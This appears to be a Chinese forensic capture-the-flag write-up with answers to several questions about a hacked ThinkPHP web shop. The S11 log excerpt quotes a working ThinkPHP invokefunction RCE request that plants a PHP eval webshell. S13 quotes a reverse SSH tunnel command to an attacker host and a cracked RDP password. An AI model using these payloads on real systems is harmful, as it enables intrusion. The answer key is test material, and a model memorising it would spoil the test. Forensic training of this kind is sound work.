## Q S11 — 上传木马的攻击者 IP

> 分析网站日志，成功在网站后台上传木马的攻击者 IP 是多少（格式：1.1.1.1）

**答案**：`222.2.2.2` （置信度 高）

**解析**

- **识别**：`/www/wwwlogs/www.tpshop.com.log` 包含完整 nginx access 日志。
- **提取**：`grep -E 'invokefunction|peiqi' /mnt/server/www/wwwlogs/www.tpshop.com.log`
- **分析**：2022-03-04 15:15:13 出现攻击痕迹：
  ```
  222.2.2.2 - - [04/Mar/2022:15:15:13] "GET /?s=/admin/\think\app/invokefunction
  &function=call_user_func_array
  &vars[0]=file_put_contents
  &vars[1][]=peiqi.php
  &vars[1][]=<?php @eval($_POST['peiqi'])?> HTTP/1.1" 200 12 "-" "Java/11.0.13"
  ```
  ThinkPHP 5.0.x `invokefunction` RCE 漏洞，把 30 字节的 `<?php @eval($_POST['peiqi'])?>` 写到网站根目录 `peiqi.php`。
  之后 222.2.2.2 持续 POST `/peiqi.php` 操控服务器（数千条）。
- **验证**：`peiqi.php` Birth time = `2022-03-04 15:15:13.781878758` 与攻击日志同秒匹配。

**不作弊声明**：仅检材日志；工具 grep / stat；脚本 `s_recon7.sh`。题目"网站后台上传"严格说不准（实际是 ThinkPHP 漏洞，未登录后台），但 222.2.2.2 是唯一通过 web 成功植马的 IP。

## Q S12 — 一句话木马 sha256

> 攻击者插入的一句话木马文件的 sha256 值是多少（格式：大写 sha256）

**答案**：`870BF66B4314A5567BD92142353189643B07963201076C5FC98150EF34CBC7CF` （置信度 高）

**解析**

- **识别**：S11 已锁定 webshell = `/www/wwwroot/www.tpshop.com/peiqi.php`，30 字节，内容 `<?php @eval($_POST['peiqi'])?>`。
- **提取**：`sudo sha256sum /mnt/server/www/wwwroot/www.tpshop.com/peiqi.php`
- **分析**：标准 PHP 一句话木马（POST 参数名 `peiqi`），无任何混淆。
- **验证**：
  ```
  870bf66b4314a5567bd92142353189643b07963201076c5fc98150ef34cbc7cf  peiqi.php
  ```
  转大写得到答案。

**不作弊声明**：仅检材；工具 sha256sum / awk；脚本 `s_peiqi_hash.sh`。

## Q S13 — RDP 扫描结果

> 攻击者使用工具对内网进行扫描后，rdp 扫描结果中的账号密码是什么（格式：abc:def）

**答案**：`administrator:Aa123456@` （置信度 高）

**解析**

- **识别**：起早王在 `/root/` 留有黑客工具集 — `kscan` (6.9MB 内网扫描器), `LinuxCheck`, `AndroRAT`, `sfz.jpg`(倩倩身份证) 等。扫描输出保存在 `/www/wwwroot/www.tpshop.com/application/result.txt`。
- **提取**：`grep RDP /mnt/server/www/wwwroot/www.tpshop.com/application/result.txt`
- **分析**：result.txt 末尾：
  ```
  ------------------------------------rdp------------------------------------
  [RDP] 192.168.100.254:3389       administrator:Aa123456@
  ```
  192.168.100.254 = 内网另一台 Windows，被 kscan + FastPwds.txt 字典爆破出弱口令 `Aa123456@`。
- **验证**：`/root/.bash_history` 中含 `ssh -CgfNR 0.0.0.0:22222:192.168.100.254:3389 root@222.2.2.2 -p33333` — 起早王把内网 RDP 经反向 SSH 隧道暴露到外网 22222 端口。

**不作弊声明**：仅检材；工具 grep；脚本 `s_recon5.sh`。

## Q S14 — 注册→首单 间隔最短用户

**解析**

- **提取**：解 binlog 同 S09。

- **验证**：在范围内 668 用户参与统计，结果稳定。

**不作弊声明**：仅检材 binlog；工具 mysqlbinlog / python3；脚本 `s_user_orders.py`。

## Q S16 — 连续三天内下单的用户数

> 找出连续三天内下单的用户并统计总共有多少个（格式：1）

**答案**：`40` （置信度 中）

**解析**

- **识别**：题目原文存在中文歧义，两种解释：
  - **解释 A**：用户在连续 3 个日历日（d, d+1, d+2）每天都至少 1 单 → count = **1**（仅 uid=1，344 单覆盖大量天）
  - **解释 B**：用户存在 3 单时间跨度 ≤ 3 个日历日 → count = **40**
- **提取**：见 S09。
- **分析**：
  ```python
  user_dates[uid] = sorted(set of order dates)
  # 解释 A: 找连续日号 (d, d+1, d+2) 每天都有单
  # 解释 B: 同用户 ≥3 单且 max_t - min_t ≤ 3*86400 秒
  ```
- **验证**：解释 A 仅命中测试 admin（uid=1），与"统计总共多少个"语义不符；解释 B 给出 40 个真实用户，更符合题目期望。

**不作弊声明**：仅检材 binlog；工具 python3；脚本 `s_consec3.py`。

> ⚠️ 题目表述有歧义。如题目本意是解释 A，则答案 = 1。
